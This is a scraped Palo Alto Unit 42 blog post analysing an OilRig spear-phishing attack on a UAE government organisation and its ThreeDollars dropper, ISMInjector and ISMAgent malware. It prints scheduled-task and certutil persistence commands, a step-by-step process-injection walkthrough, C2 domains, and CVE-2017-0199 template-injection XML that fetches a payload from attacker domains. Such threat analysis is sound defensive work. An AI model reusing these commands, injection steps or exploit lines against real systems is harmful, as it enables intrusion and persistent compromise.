{
    "title": "oilrig group steps up attacks with new delivery documents and new injector trojan",
    "text": "Tools\nPlaybooks\nSpeaking Events\nAbout Us\nOilRig Group Steps Up Attacks with New Delivery\nDocuments and New Injector Trojan\n24,089\npeople reacted\n1\n12 min. read\nUnit 42’s ongoing research into the OilRig campaign  shows that the threat actors involved in the original attack\ncampaign continue to add new Trojans to their toolset and continue their persistent attacks in the Middle East.\nWhen we first discovered the OilRig attack campaign in May 2016, we believed at the time it was a unique attack\ncampaign likely operated by a known, existing threat group. As we have progressed in our research and\nuncovered additional attack phases, tooling, and infrastructure as discussed in our recent posting “ Striking Oil: A\nCloser Look at Adversary Infrastructure ”, it has become apparent that the threat group responsible for the OilRig\nattack campaign is likely to be a unique, previously unknown adversary. Additionally, others have been referring to\nthe group responsible for the OilRig campaign itself as the OilRig group as well. To that end, we are elevating the\nOilRig attack campaign to be known as the OilRig group.\nIn July 2017, we observed the OilRig group using a tool they developed called ISMAgent  in a new set of targeted\nattacks. The OilRig group developed ISMAgent as a variant of the ISMDoor Trojan. In August 2017, we found this\nthreat group has developed yet another Trojan that  they call ‘Agent Injector’ with the specific purpose of\ninstalling the ISMAgent backdoor. We are tracking this tool as ISMInjector. It has a sophisticated architecture and\ncontains anti‐analysis techniques that we have not seen in previous tools developed by this threat group. The\ncomplex structure and inclusion of new anti‐analysis techniques may suggest that this group is increasing their\ndevelopment efforts in order to evade detection and gain higher efficacy in their attacks.\nThe Attack\nOn August 23, 2017, we observed OilRig targeting an organization within the United Arab Emirates government.\nThe attack involved a spear‐phishing email that had a subject of “Importan Issue” and two Zip archives attached,\nas seen in Figure 1. Note that “Important” is misspelled in the sample as shown below.\nFigure 1 Delivery email that contains two Zip archives that contain the malicious delivery documents\nThe message body in the attack email contains an image that is hosted on a remote server. As shown in Figure 2,\nhovering over the image shows that the URL link is to an image hosted at “www.cdnakamaiplanet[.]com” which\nwe have reason to believe is an adversary owned domain. It is likely that the image was embedded to track if the\nrecipient opened the email or not.\nFigure 2 URL associated with image included in delivery email\nAnother interesting facet of this attack is that the email addresses in the “To” and “From” fields are from\naddresses from the same domain. Our initial assumption was that the email address in the “From” field was likely\nspoofed. Additional analysis of the email headers revealed that it did not contain a list of external email servers\nused to deliver the message as expected from a spoofed email; instead, we discovered the following string within\nthe email headers:\nClient=OWA;Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04;\nThis string in the header suggests that the OilRig actor is likely to have used the targeted organization’s Outlook\nWeb Access (OWA) to send the phishing email using Firefox 36.\nUsing information from our research in the Striking Oil  blog, we know the OilRig group has conducted credential\nharvesting campaigns specifically by emulating OWA login sites. Based on that research and this observation, we\npostulate that the OilRig group gathered credentials to a legitimate user’s OWA account and logged into the\nuser’s account to send phishing attacks to other individuals within the same, targeted organization. Also, Firefox\n36 was released in February 2015; since this email was sent August 2017, we believe it suggests the actors are\nusing an outdated version of Firefox to log into the target organization’s OWA.\nThe Delivery\nThe August 23, 2017 phishing attack contained two Zip archives to the email, “Issue‐doc.zip” and “Issue‐doc1.zip”.\nEach Zip attachment contains one file, with “Issue.doc” within “Issue‐doc.zip” and “Issue.dot” within “Issue‐\ndoc1.zip”. The “Issue.doc” and “Issue.dot” files are both malicious documents that will attempt to run in Microsoft\nWord.\nIssue.doc is a Word document that contains a malicious macro that the actors attempt to trick the victim into\nexecuting by instructing the user to click the Enable Content button as shown in Figure 3. We track this malicious\ndelivery document as ThreeDollars.\nFigure 3 Malicious “ThreeDollars” Microsoft Word Document\nOnce enabled, the macro reads in the initial document, searches the data for a delimiter of “###$$$” to find the\nbase64 encoded payload then writes the encoded payload to the file %APPDATA%\\Base.txt. The following\nshows a hexdump of the delimiter followed by the encoded payload:\nThe macro runs a PowerShell command that will decode the contents of the %APPDATA%\\Base.txt file and save\nit to the file %PUBLIC%\\Libraries\\servicereset.exe, which it will then execute. The “servicereset.exe” file is a\nnew tool in OilRig’s arsenal that we call ISMInjector, which we will discuss in detail in the next section.\nIssue.dot is a file that attempts to exploit CVE‐2017‐0199 Microsoft Word Office/WordPad Remote Code\nExecution Vulnerability  using the following code:\nAs displayed by the code example above, Index.dot file attempts to load a malicious exploit document hosted at\n“msoffice‐cdn[.]com”, which is the same URL that hosted the exploit document used in an attack that ClearSky\npublished on August 28, 2017. By correlating artifacts found in Index.dot, we discovered another sample\nattempting to exploit CVE‐2017‐0199 used in a separate attack, this time using “office365‐management[.]com” as\nthe C2 domain.\nThe resulting payload from this related delivery document is an ISMAgent Trojan that is configured to use\n“msoffice365update[.]com” as its C2 server. Please reference our previous blog on ISMAgent  for more\ninformation on this Trojan.\nISMInjector\nUltimately, the payload delivered by ThreeDollars is a new tool that we track as ISMInjector. As its name\nsuggests, ISMInjector is a Trojan that is responsible for injecting a Trojan into another process. The payload\nembedded within the ISMInjector sample delivered in this attack is a variant of the ISMAgent backdoor that we\nhad discussed in detail in our blog  discussing a targeted attack on a Saudi Arabian technology company.\nAt face value, ISMInjector is obfuscated with the off‐the‐shelf SmartAssembly .NET obfuscator created by red‐\ngate.com. The first execution of ISMInjector starts by copying itself to %localappdata%\\srvBS.txt and enables\npersistent access to the system. The code achieves persistence by referencing two resources that contain\ncommands the code will execute by running them within a command prompt process, as seen in the following\nscreenshot:\nThe two resources that contain commands that ISMInjector uses for persistence are named “Tsk1” and “Tsk2”.\nThe specific commands within each of these resources are within Table 1. At a high level, the“Tsk1” command\ncreates a scheduled task named “ReportHealth” that is meant to run a payload saved to\n“%localappdata%\\srvHealth.exe” every 4 minutes. The “Tsk2” command creates a scheduled task that runs every\n2 minutes that is responsible for saving the payload to srvHealth.exe. This task saves the payload to this location\nusing the “certutil” command to decode the original payload saved to “srvBS.txt”.\nReso\nurce\nNameResource Value\nTsk1 SchTasks /Create /SC MINUTE /MO 4 /TN \\”ReportHealth\\” /TR \\”%localappdata%\\\\srvHealth.exe\\” /f\nTsk2SchTasks /Create /SC MINUTE /MO 2 /TN \\”LocalReportHealth\\” /TR \\”cmd.exe /c certutil ‐decode\n%localappdata%\\\\srvBS.txt %localappdata%\\\\srvHealth.exe && schtasks /DELETE /tn LocalReportHealth /f && del\n%localappdata%\\\\srvBS.txt\\””\nTable 1 Resources in ISMInjector containing commands for persistence\nSubsequent executions of the ISMInjector sample from srvHealth.exe will execute its functional code.\nISMInjector’s functional code is split into two different embedded modules named Inner.dll and Joiner.dll that\nwork in conjunction to inject an embedded ISMAgent payload into another process. The two modules, which we\nwill refer to as Joiner and Inner, have the following debug paths, which suggest the author of these modules refer\nto this Trojan as “Agent Injector”:\nC:\\Users\\J‐Win‐10\\Desktop\\Agent Injector\\PolicyConverter\\Inner\\obj\\Release\\Inner.pdb\nC:\\Users\\J‐Win‐10\\Desktop\\Agent Injector\\PolicyConverter\\Joiner\\obj\\Release\\Joiner.pdb\nThe main function within the ISMInjector assembly uses the Joiner module to construct the final payload and the\nInner module to inject the final payload into a process. Figure 4 shows the ISMInjector’s main function that uses\nthe two modules to carry out its injection process before exiting.\nFigure 4 ISMInjector’s main function uses methods within the Joiner and Inner modules\nThe Joiner module contains four resources named P11, P12, P21 and P22, which are all 35840 bytes of binary\ndata. It reads the P11 and P12 resources and saves them to a variable, effectively concatenating them together.\nThe module uses the same logic to concatenate the P21 and P22 resources together, and finally concatenates\nthe P11+P12 variable with the P21+P22 variable, which results in the construction of a binary executable.\nThe ISMInjector code then calls the “LoadDll” method within the Inner module, providing the string “Run”, the\npayload constructed by the Joiner module, and a path to the “RegAsm.exe” executable as arguments, as seen in\nFigure 4.\nThe LoadDLL method constructs an embedded assembly, using the same method as the Joiner module used to\nconstruct the final payload. However, the Inner module creates another module that is used to actually perform\nthe code injection. To create this embedded module, the Inner module references two resources named D1 and\nD2 and concatenates them together. The resulting .NET assembly has a class called “ClsV2” that has a method\nnamed “Run”, which is called in the LoadDll function call shown in Figure 4. The “Run” method within the “ClsV2”\nclass is invoked to execute the payload.\nThe “Run” method calls functions that has a state machine that dictates the actions taken. At a high level, these\nstate machines attempt to create a process and inject the constructed payload into the newly created process.\nThe use of state machines complicates analysis efforts because it makes the flow of execution jump around in a\nnon‐sequential fashion.\nTable 2 contains the path through the state machines that ISMInjector uses to create a remote process, inject its\nembedded payload then run the payload. Each row of the table contains the current state, a description of the\nactivities performed within that state, as well as the next state that will be set and run. The state values jump\naround dramatically, which requires an analyst to also jump around the code to determine its functionality. This is\nan interesting anti‐analysis technique we have not seen the OilRig actors use in their other tools.\nS\nt\na\nt\neDescriptionNext\nState\n1\n9Initializes array 10\n1\n0Initializes array 6\n6 Initializes array 3\n3 Initializes array 14\n1\n4Initializes array 15\n1\n5Initializes array 16\n1\n6Initializes array 12\n1\n2Initializes array 18\n1\n8Initializes array 8\n8 Initializes array 25\n2\n5Initializes array 1\n1 Initializes array 4\n4 Resolves the CreateProcessA function 21\n2\n1Resolves the SetThreadContext function 26\n2\n6Resolves the GetThreadContext function 17\n1\n7Resolves the ReadProcessMemory function 27\n2\n7Resolves the WriteProcessMemory function 24\n2\n4Resolves the NtUnmapViewOfSection function 7\n7 Resolves the VirtualAllocEx function 0\n0 Resolves the ResumeThread function 23\n2\n3Formats a text string as “{0}”, which is the path to the “RegAsm.exe” executable 5\n5 Instantiates a STARTUPINFO structure 22\n2\n2Instantiates a PROCESS_INFORMATION structure 11\n1\n1Sets the size (cb field) of the STARTUPINFO structure 20\n2\n0Enters another state machine to handle the execution of a process 29\nEnter sub‐state machine\n7Concatenates the path to the “RegAsm.exe” with a space and a second string, which in\nthis sample is empty37\n3\n7Calls the CreateProcessA function using the concatenated string created in previous\nstate. The CREATE_SUSPENDED flag is used in this API function call to create the\nprocess in a suspended state.44\n4\n4Creates a variable to store the process’ ImageBase 19\n1\n9Creates a thread CONTEXT structure 14\n1\n4Sets the first index in the context structure to 65538, which sets the ContextFlags value\nin the structure to CONTEXT_INTEGER10\n1\n0Checks the value of IntPtr.Size to determine x86 or x64 process. 27 or 23\n2\n7Calls GetThreadContext to get the context of the suspended thread in the newly created\nand suspended process. It then stores the EBX register in the suspended thread into a\nvariable23\n2\n3Calls ReadProcessMemory to read EBX+8 in the suspended process to get the base\naddress of the process. It then creates a variable to store the SizeOfImage from the PE\nheader of the payload it intends to inject into the process22\n2\n2Creates a variable to store the SizeOfHeaders value from the PE header of the payload it\nintends to inject into the process25\n2\n5Calls VirtualAllocEx to create a new buffer in the suspended process at the base address\nof the process41\n4\n1It calls WriteProcessMemory to write the PE header of the payload to the buffer created\nat the base address of the suspended process.31\n3\n1Enters a loop in the state machine to effectively write the embedded payload section by\nsection to the allocated buffer. Does so by setting a counter to 0 that will be compared to\nNumberOfSections in each iteration of the loop45\n4\n5Sets a variable for the VirtualAddress of the PE section 29\n2\n9Sets a variable for the SizeOfRawData of the PE section 28\n2\n8Sets a variable for the PointerToRawData of the PE section 2\n2If SizeOfRawData variable is 0 it moves onto the next section by going to state 30, else it\ngoes to state 2030 or 20\n3\n0Increments counter to compare to NumberOfSections 38 (same as 45)\n2\n0Creates a byte array with a size of SizeOfRawData for the SectionData 21\n2\n1Copies bytes from the embedded payload to the SectionData buffer 36\n3\n6Writes the SectionData buffer to the correct VirtualAddress within the remote process\nmemory.  If WriteProcessMemory succeeds, it continues in the loop by going to state 30.\nOtherwise, after all the sections are written to the remote process, state 13 is chosen30 or 13\n1\n3Sets a variable to store the new base address of the payload copied into the remote\nprocess memory.18\n1\n8Sets the EIP value within the CONTEXT structure to store the AddressOfEntryPoint of\nthe injected payload0\n0Checks to see if the process is x86 or x64 based on the inPtr size being 4. 16 (x86) or 33 (x64)\n1\n6\no\nr\n3\n3Calls SetThreadContext using the CONTEXT structure with the new entrypoint to the\ninjected payload and calls ResumeThead to run the suspended thread. This effectively\nruns the injected payload in the process space of RegAsm.exe.End of sub‐state machine\nResumes initial state machine\n2\n9Ends the function by returning End\n Table 2 State machines used by ISMInjector to inject and execute its payload in another process\nThe executable injected into the RegAsm.exe process is a variant of the ISMAgent Trojan, which is very similar in\nbehavior to the ISMAgent payload discussed in our previous blog . This ISMAgent payload is configured to use\n“cdnmsnupdate[.]com” as its C2 server using both HTTP and DNS tunneling channels.\nIt appears the OilRig group may have simply repurposed the injection code from an open source file called\nDynamicCallRunPE.cs, which is available on GitHub  and Codegists .  The actors did not use this code without\nmodification; instead, they used state machines as an obfuscation technique to disguise the injection code.\nThe path that ISMInjector takes through the state machine and the activities are almost identical to the activities\ncarried out in the DynamicCallRunPE.cs code. It is also possible that this portion of the ISMInjector was\nobfuscated by a crypter that the threat actors used to further complicate analysis.\nInfrastructure\nBeginning with the initial phishing email, we discovered a significant infrastructure for this attack wave that also\nshowed relationships to previous Oilrig attack campaigns both from an infrastructure perspective and shared\ncode.\nMuch like previous Oilrig attacks, the C2 domains used typo‐squatting techniques in order to attempt to evade\ndetection. The image embedded within the phishing email is hosted on cdnakamaiplanet[.]com, which resolves to\n82.102.14.216. As with other OilRig attacks, this IP is not reused to resolve to any other domain. However, two\nother IPs on the same /24 netblock are found to be used as C2s. 82.102.14.222 is found to resolve to Microsoft‐\npublisher[.]com, which we observed as a C2 for our initial ISMAgent finding. 82.102.14.246 resolves to\nadpolioe[.]com, hich appears to be a typo‐squatted domain that also hosts a sample of ISMAgent at\nhxxp://82.102.14[.]246/webdav/aws.exe. This sample’s C2 is cdnmsnupdate[.]com which turns out to be the C2\nserver for three other samples, one ISMAgent and two of them being ISMAgentInjector. Reverse resolution of\nthis domain provides us the IP 74.91.19.122, which again is not used for any other domain resolution. Another IP\non the same /24 is found at 74.91.19.108 resolving to msoffice365update[.]com which happens to be the C2\ndomain for the ISMAgent payload delivered by the malicious document exploiting CVE‐2017‐1099 mentioned\nearlier in this blog.\nAs previously discussed, the .dot file attempting to exploit CVE‐2017‐0199 uses msoffice‐cdn[.]com as a C2 to\nretrieve additional malicious code. Reverse resolution of this domain shows an IP of 185.162.235.121, which\nshares a /24 netblock with 185.162.235.29. This IP resolves to office365‐management[.]com which is the C2 for\na secondary .dot file we were able to collect in this attack wave. In figure 5 below you can see the OilRig\ninfrastructure for ISMInjector that our research uncovered.\nFigure 5 OilRig infrastructure for ISMInjector\nConclusion\nThe OilRig group continues to target organizations in the Middle East, in this instance targeting the government of\nthe United Arab Emirates. They continue to use the ISMAgent Trojan as the final payload in their attacks, this\ntime in conjunction with a custom injector Trojan to assist with delivery and execution. The injector Trojan was\nobfuscated using a known crypter and used state‐machines as an anti‐analysis technique to complicate its\nprocess to inject the payload into another process. The use of crypters and anti‐analysis techniques suggests that\nthe threat actors are increasing their efforts to evade security products to successfully compromise its targets.\nAs our research continues to expand into the OilRig group, we are continuously discovering new infrastructure\nwhich directly overlaps with previously used infrastructure. With the addition of the reuse of tools, similar attack\nprotocols, as well as consistent victimology, we have strong confidence that the original OilRig attack campaign is\nindeed a single, unique, and previously unknown threat group that will hereby be referred to as the OilRig group.\nPalo Alto Networks customers are protected from ISMInjector, ISMAgent and ThreeDollars by the following:\nAll ISMInjector, ISMAgent and ThreeDollars samples are marked with a malicious verdict in WildFire\nAutoFocus customers can track these malware families via:\nISMInjector\nISMAgent\nThreeDollars\nIndicators of Compromise\nThreeDollars SHA256\n119c64a8b35bd626b3ea5f630d533b2e0e7852a4c59694125ff08f9965b5f9cc\nISMInjector SHA256\n33c187cfd9e3b68c3089c27ac64a519ccc951ccb3c74d75179c520f54f11f647\nISMAgent SHA256\n74f61b6ff0eb58d76f4cacfb1504cb6b72684d0d0980d42cba364c6ef28223a8\nISMAgent C2\ncdnmsnupdate[.]com\nRelated CVE‐2017‐0199 SHA256\n66358a295b8b551819e053f2ee072678605a5f2419c1c486e454ab476c40ed6a\nRelated CVE‐2017‐0199 Domains\nmsoffice‐cdn[.]com\noffice365‐management[.]com\nAdditional Hashes\nf92ab374edd488d85f2e113b40ea8cb8baf993f5c93c12455613ad3265f42b17 (CVE‐2017‐0199)\nfcad263d0fe2b418db05f47d4036f0b42aaf201c9b91281dfdcb3201b298e4f4 (ISMInjector)\n0ccb2117c34e3045a4d2c0d193f1963c8c0e8566617ed0a561546c932d1a5c0c (ThreeDollars)\na9f1375da973b229eb649dc3c07484ae7513032b79665efe78c0e55a6e716821 (ISMAgent)\n963f93824d87a56fe91283652eab5841e2ec538c207091dbc9606b962e38805d (ISMAgent)\nAdditional Domains\nntpupdateserver[.]com\ncdnakamaiplanet[.]com\nmsoffice365update[.]com\nadpolioe[.]com\nMicrosoft‐publisher[.]com\nGet updates from Palo Alto  Networks!\nSign up to receive the latest news, cyber threat intelligence and research from us\nBy Robert Falcone  and Bryan Lee\nOctober 9, 2017 at 10:00 AM\nCategory: Unit 42\nTags: ISMAgent , ISMInjector CVE‐2017‐0199 , OilRig , ThreeDollars\nEmail address\nSubscribe\nI'm not a robot\nreCAPTCHA\nPrivacy  - Terms\nBy submitting this form, you agree to our Terms of Use  and acknowledge\nour Privacy Statement .\n© 2020 Palo Alto Networks, Inc. All rights reserved.\nPopular Resources\nResource Center\nBlog\nCommunities\nTech Docs\nUnit 42\nSitemap\nLegal No ces\nPrivacy\nTerms of Use\nDocuments\nAccount\nManage Subscriptions\nReport a Vulnerability1\n2\n3\n4\n500088200   23 23 23 24 24 24 54 56  71 51 41 41 4d 41 41 41  |###$$$TVqQAAMAAA|\n00088210   41 45 41 41 41 41 2f 2f  38 41 41 4c 67 41 41 41  |AEAAAA//8AALgAAA|\n00088220   41 41 41 41 41 41 51 41  41 41 41 41 41 41 41 41  |AAAAAAQAAAAAAAAA |\n00088230   41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA |\n..snip..\n1\n2\n3\n4\n5<relationship ID =\"rId5\"\nType=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/ole\nObject\" Target=\"http://www.msoffice-\ncdn.com/updatecdnsrv/prelocated/owa/auth/template.rtf\n\" TargetMode =\"External\" />\n1\n2\n3\n4<Relationship Id=\"rId5\" \nType=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/ole\nObject\" Target=\"http://office365-management.com/updatejuly/template.rtf\"  \nTargetMode =\"External\" />\nSearch Unit 42\nSHARE \n "
}